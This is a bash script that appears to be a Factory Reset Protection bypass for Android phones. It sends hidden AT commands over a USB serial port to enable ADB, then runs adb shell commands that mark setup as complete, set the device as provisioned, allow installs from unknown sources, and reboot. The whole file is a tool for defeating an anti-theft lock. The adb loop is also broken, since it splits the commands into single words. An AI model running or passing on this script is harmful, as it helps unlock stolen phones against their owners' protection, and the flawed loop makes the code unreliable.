#!/usr/bin/env bash

# AT Commands payload
echo "Sending AT commands..."
for AT_CMDS in \
    "AT+KSTRINGB=0,3" \
    "AT+DUMPCTRL=1,0" \
    "AT+DEBUGLVC=0,5" \
    "AT+SWATD=0" \
    "AT+ACTIVATE=0,0,0" \
    "AT+SWATD=1" \
    "AT+DEBUGLVC=0,5"
do echo $AT_CMDS > /dev/ttyACM0 ; sleep 1
done

# ADB is now enabled, we need to complete setup.
echo "Please press Allow and Remember device."
adb kill-server
adb wait-for-device
for ADB_CMDS in \
    settings put global setup_wizard_has_run 1 \
    settings put secure user_setup_complete 1 \
    content insert --uri content://settings/secure --bind name:s:DEVICE_PROVISIONED --bind value:i:1 \
    content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1 \
    content insert --uri content://settings/secure --bind name:s:INSTALL_NON_MARKET_APPS --bind value:i:1 \
    am start -c android.intent.category.HOME -a android.intent.action.MAIN
do adb shell $ADB_CMDS
done

sleep 5 
adb shell am start -n com.android.settings/com.android.settings.Settings
echo "FRP unlock commands completed running... You check for errors yourself..."
sleep 5
adb reboot
